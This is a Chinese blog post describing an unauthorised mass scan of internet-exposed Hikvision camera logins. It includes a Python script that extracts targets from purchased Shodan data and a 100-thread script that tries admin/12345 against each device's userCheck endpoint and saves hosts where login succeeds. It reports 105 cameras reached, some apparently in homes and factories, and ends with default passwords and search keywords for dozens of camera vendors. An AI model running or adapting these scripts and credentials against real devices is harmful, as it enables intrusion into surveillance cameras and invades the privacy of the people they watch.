<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1"><meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="author" content="zu1k"><meta name="subtitle" content="an interest-driven blog"><meta name="description" content="Hi, I'm zu1k, a boy dreaming of traveling around the world. "><meta name="keywords" content="zu1k,lgf,zuik,lgf.im"><title>针对海康威视网络摄像头弱密码的一次扫描 | zu1k</title><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/style.css"><script src="/js/script.js"></script><script src="/js/tocbot.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="zu1k" type="application/atom+xml"><link rel="alternate" href="/rss2.xml" title="zu1k" type="application/rss+xml"></head><body><div class="wrapper"><header><nav class="navbar"><div class="container"><div class="navbar-header header-logo"><a href="/">ZU1K</a></div><div class="menu navbar-right"><a class="menu-item" href="/archives">Posts</a> <a class="menu-item" href="/category">Category</a> <a class="menu-item" href="/tag">Tag</a> <a class="menu-item" href="/about">About</a> <a class="menu-item" href="/feed">Feed</a> <input id="switch_default" type="checkbox" class="switch_default"> <label for="switch_default" class="toggleBtn"></label></div></div></nav><nav class="navbar-mobile" id="nav-mobile"><div class="container"><div class="navbar-header"><div><a href="/">ZU1K</a><a id="mobile-toggle-theme">·&nbsp;Light</a></div><div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div></div><div class="menu" id="mobile-menu"><a class="menu-item" href="/archives">Posts</a> <a class="menu-item" href="/category">Category</a> <a class="menu-item" href="/tag">Tag</a> <a class="menu-item" href="/about">About</a> <a class="menu-item" href="/feed">Feed</a></div></div></nav></header><script>var mobileBtn=function(){var e=document.getElementsByClassName("menu-toggle")[0],t=document.getElementById("mobile-menu");e.classList.contains("active")?(e.classList.remove("active"),t.classList.remove("active")):(e.classList.add("active"),t.classList.add("active"))}</script><div class="main"><div class="container"><div class="post-toc"><div class="tocbot-list"></div><div class="tocbot-list-menu"><a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a> <a onclick="go_top()">Back to top</a> <a onclick="go_bottom()">Go to bottom</a></div></div><script>function expand_toc(){var o=document.querySelector(".tocbot-toc-expand");tocbot.init({tocSelector:".tocbot-list",contentSelector:".post-content",headingSelector:"h1, h2, h3, h4, h5",collapseDepth:6,orderedList:!1,scrollSmooth:!0}),o.setAttribute("onclick","collapse_toc()"),o.innerHTML="Collapse all"}function collapse_toc(){var o=document.querySelector(".tocbot-toc-expand");tocbot.init({tocSelector:".tocbot-list",contentSelector:".post-content",headingSelector:"h1, h2, h3, h4, h5",collapseDepth:1,orderedList:!1,scrollSmooth:!0}),o.setAttribute("onclick","expand_toc()"),o.innerHTML="Expand all"}function go_top(){window.scrollTo(0,0)}function go_bottom(){window.scrollTo(0,document.body.scrollHeight)}document.ready(function(){tocbot.init({tocSelector:".tocbot-list",contentSelector:".post-content",headingSelector:"h1, h2, h3, h4, h5",collapseDepth:1,orderedList:!1,scrollSmooth:!0})})</script><article class="post-wrap"><header class="post-header"><h1 class="post-title">针对海康威视网络摄像头弱密码的一次扫描</h1><div class="post-meta">Author: <a itemprop="author" rel="author" href="/">zu1k</a> <span class="post-time">Date: <a href="#">2019-11-28&nbsp;&nbsp;20:15</a> </span><span class="post-category">Category: <a href="/categories/coding/">coding</a></span></div></header><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。</p><p>海康威视web界面的弱密码是 admin 12345</p><p>时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描</p><h2 id="从shodan获取数据"><a href="#从shodan获取数据" class="headerlink" title="从shodan获取数据"></a>从shodan获取数据</h2><p>首先需要搞到全网所有能够访问到的海康威视机器的IP，这是个工作量极大的任务，如果自己进行全网服务扫描的话无论是时间周期还是耗费资金都是我无法承受的</p><p>之前了解过shodan，shodan被称为“最恐怖的搜索引擎”，能够提供多年来其扫描到的全网提供的服务，可惜数据的价格极高</p><p>今年黑五是shodan诞生第十年，shodan给出极大的优惠，正式会员+20credit只需要1刀，手头有信用卡和企业邮箱的我二话不说先上了20个账号</p><p>有了shodan的credit就可以购买它的数据了。海康威视的web管理界面的关键词很简单，只需要在shodan搜索“hikvision”</p><p>在我写这篇博客的时候搜索到的数据有18万条，前段时间我下载数据的时候是19万条。</p><p>下载大量数据是需要花credit的，1credit可以下载1万条数据，所以19万多的数据花费了我20credit，正常情况下20credit是49刀，这次黑五真是太实惠了</p><h2 id="提取有用信息"><a href="#提取有用信息" class="headerlink" title="提取有用信息"></a>提取有用信息</h2><p>有了数据之后通过python解析，检查是否存在http服务，如果存在就提取ip和port</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">fi = open(<span class="string">&quot;shodan_data.json&quot;</span>)</span><br><span class="line">fo = open(<span class="string">&quot;ip.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">line = fi.readline()</span><br><span class="line">numall = <span class="number">1</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    line = fi.readline()</span><br><span class="line">    numall = numall+<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = json.loads(line)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;http&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            num = num+<span class="number">1</span></span><br><span class="line">            txt = a[<span class="string">&#x27;http&#x27;</span>][<span class="string">&#x27;host&#x27;</span>]+<span class="string">&#x27;:&#x27;</span>+str(a[<span class="string">&#x27;port&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            fo.write(txt)</span><br><span class="line">            print(txt)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">fo.close()</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line">print(numall)</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure><h2 id="分析与扫描"><a href="#分析与扫描" class="headerlink" title="分析与扫描"></a>分析与扫描</h2><p>然后通过多线程python脚本进行弱密码批量扫描。</p><p>通过手工尝试找到一台可以弱密码登录进去的机器，通过burp抓包分析，找到用来验证弱密码的接口。</p><p>分析发现登录使用的是base auth，这就简单了。使用的接口是userCheck，如果登录成功应该返回200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#批量筛选海康威视摄像头的弱密码</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Threads</span>():</span></span><br><span class="line">    threadlist=[]</span><br><span class="line">    myqueue=queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> open(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>): <span class="comment">#扫描出的ip</span></span><br><span class="line">        myqueue.put(ip.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):  <span class="comment">#线程数</span></span><br><span class="line">        th=threading.Thread(target=scan_Hikvision,args=(myqueue,))</span><br><span class="line">        threadlist.append(th)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_Hikvision</span>(<span class="params">myqueue</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> myqueue.empty():</span><br><span class="line">        ip=myqueue.get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(<span class="string">&quot;[*]scan:&quot;</span>+ip)</span><br><span class="line">            r = requests.get(url=(<span class="string">&quot;http://%s/PSIA/Custom/HIK/userCheck&quot;</span> % ip),auth=(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;12345&#x27;</span>),timeout=<span class="number">10</span>)</span><br><span class="line">            status = re.findall(<span class="string">r&#x27;&lt;statusValue&gt;(.*)&lt;/statusValue&gt;&#x27;</span>, r.text)</span><br><span class="line">            <span class="keyword">if</span> status[<span class="number">0</span>] == <span class="string">&#x27;200&#x27;</span>:</span><br><span class="line">                print(<span class="string">&#x27;[√] Host http://&#x27;</span>+ ip +<span class="string">&#x27; Login Success!\n&#x27;</span>)</span><br><span class="line">                f = open(<span class="string">&#x27;ok.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                f.write(ip+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                f.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Threads()</span><br></pre></td></tr></table></figure><p>正好有个美国的vps，就扔到这个服务器上进行扫描，本机也开起来扫</p><p>100线程很快就扫描完毕了，国内外扫描完的结果去重后一共留下105个可登录弱密码。感觉不应该只有这么点，登录后查看只发现一个版本的海康威视，可能是检测弱密码的接口在其他版本中不存在，或者其他版本默认密码更换或者其他原因</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>海康威视应该是采取了手段来避免弱密码的再次产生，但是之前老版本的DVR还有一部分并没有进行更新，大部分是农村的家庭或工厂监控，大家也都不太懂，并没有修改默认密码</p><p>心里不是滋味，身边也有一些父母的朋友他们让我帮忙安装一些路由器、监控等设备，他们的文化水平不高，当我要给他们修改密码的时候，一部分会选择手机号码，也有一部分让我不要修改密码，说改了别记不住，直接出厂密码就行了，忘了可以看一下说明书</p><p>能不能想出一种办法，既考虑到安全性，又能顾虑到这部分人的需求，这是个问题</p><h2 id="弱密码收集"><a href="#弱密码收集" class="headerlink" title="弱密码收集"></a>弱密码收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1.海康威视IP网络摄像机：</span><br><span class="line">用户：admin，密码：12345</span><br><span class="line">zoomeye搜索关键词：hikvision</span><br><span class="line">2.大华网络摄像机：</span><br><span class="line">user:admin pass:admin 管理权限</span><br><span class="line">user:default pass:user 用户默认登陆帐号</span><br><span class="line">user:888888 pass:admin</span><br><span class="line">user:666666 pass:user</span><br><span class="line">zoomeye搜索关键词：WEB SERVICE</span><br><span class="line">3.cctv摄像机：</span><br><span class="line">user：admin pass：空</span><br><span class="line">telnet登陆 user：root pass：”juantech”</span><br><span class="line">zoomeye搜索关键词：JAWS&#x2F;1.0</span><br><span class="line">4.SQ-WEBCAM摄像机：</span><br><span class="line">user：admin pass：admin</span><br><span class="line">zoomeye搜索关键词：SQ-WEBCAM</span><br><span class="line">ACTi: admin&#x2F;123456 or Admin&#x2F;123456</span><br><span class="line">American Dynamics: admin&#x2F;admin or admin&#x2F;9999</span><br><span class="line">Arecont Vision: none</span><br><span class="line">Avigilon: admin&#x2F;admin</span><br><span class="line">Axis: traditionally root&#x2F;pass, new Axis cameras require password creation during first login</span><br><span class="line">Basler: admin&#x2F;admin</span><br><span class="line">Bosch: none</span><br><span class="line">Brickcom: admin&#x2F;admin</span><br><span class="line">Canon: root&#x2F;camera</span><br><span class="line">Cisco: No default password, requires creation during first login</span><br><span class="line">Dahua: admin&#x2F;admin</span><br><span class="line">Digital Watchdog: admin&#x2F;admin</span><br><span class="line">DRS: admin&#x2F;1234</span><br><span class="line">DVTel: Admin&#x2F;1234</span><br><span class="line">DynaColor: Admin&#x2F;1234</span><br><span class="line">FLIR: admin&#x2F;fliradmin</span><br><span class="line">Foscam: admin&#x2F;</span><br><span class="line">GeoVision: admin&#x2F;admin</span><br><span class="line">Grandstream: admin&#x2F;admin</span><br><span class="line">Hikvision: admin&#x2F;12345</span><br><span class="line">Honeywell: admin&#x2F;1234</span><br><span class="line">IQinVision: root&#x2F;system</span><br><span class="line">IPX-DDK: root&#x2F;admin or root&#x2F;Admin\</span><br><span class="line">JVC: admin&#x2F;jvc</span><br><span class="line">March: Networks: admin&#x2F;</span><br><span class="line">Mobotix: admin&#x2F;meinsm</span><br><span class="line">Panasonic: admin&#x2F;12345</span><br><span class="line">Pelco Sarix: admin&#x2F;admin</span><br><span class="line">Pixord: admin&#x2F;admin</span><br><span class="line">Samsung Electronics: root&#x2F;root or admin&#x2F;4321</span><br><span class="line">Samsung Techwin (old): admin&#x2F;1111111</span><br><span class="line">Samsung (new): admin&#x2F;4321</span><br><span class="line">Sanyo: admin&#x2F;admin</span><br><span class="line">Scallop: admin&#x2F;password</span><br><span class="line">Sentry360 (mini): admin&#x2F;1234</span><br><span class="line">Sentry360 (pro): none</span><br><span class="line">Sony: admin&#x2F;admin</span><br><span class="line">Speco: admin&#x2F;1234</span><br><span class="line">Stardot: admin&#x2F;admin</span><br><span class="line">Starvedia: admin&#x2F;</span><br><span class="line">Trendnet: admin&#x2F;admin</span><br><span class="line">Toshiba: root&#x2F;ikwd</span><br><span class="line">VideoIQ: supervisor&#x2F;supervisor</span><br><span class="line">Vivotek: root&#x2F;</span><br><span class="line">Ubiquiti: ubnt&#x2F;ubnt</span><br><span class="line">Wodsee: admin&#x2F;</span><br></pre></td></tr></table></figure></div><section class="post-tags"><div><span>Tag(s):</span> <span class="tag"><a href="/tags/scan/"># scan</a> <a href="/tags/web/"># web</a></span></div><div><a href="javascript:window.history.back();">back</a> <span>· </span><a href="/">home</a></div></section><section class="post-nav"><a class="prev" rel="prev" href="/2019/some-git-skills.html">一些我刚学到的GIT技巧</a> <a class="next" rel="next" href="/2019/learning-maillist.html">了解邮件列表</a></section></article></div></div><footer id="footer" class="footer"><div class="copyright"><span>© zu1k | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span></div></footer></div></body></html>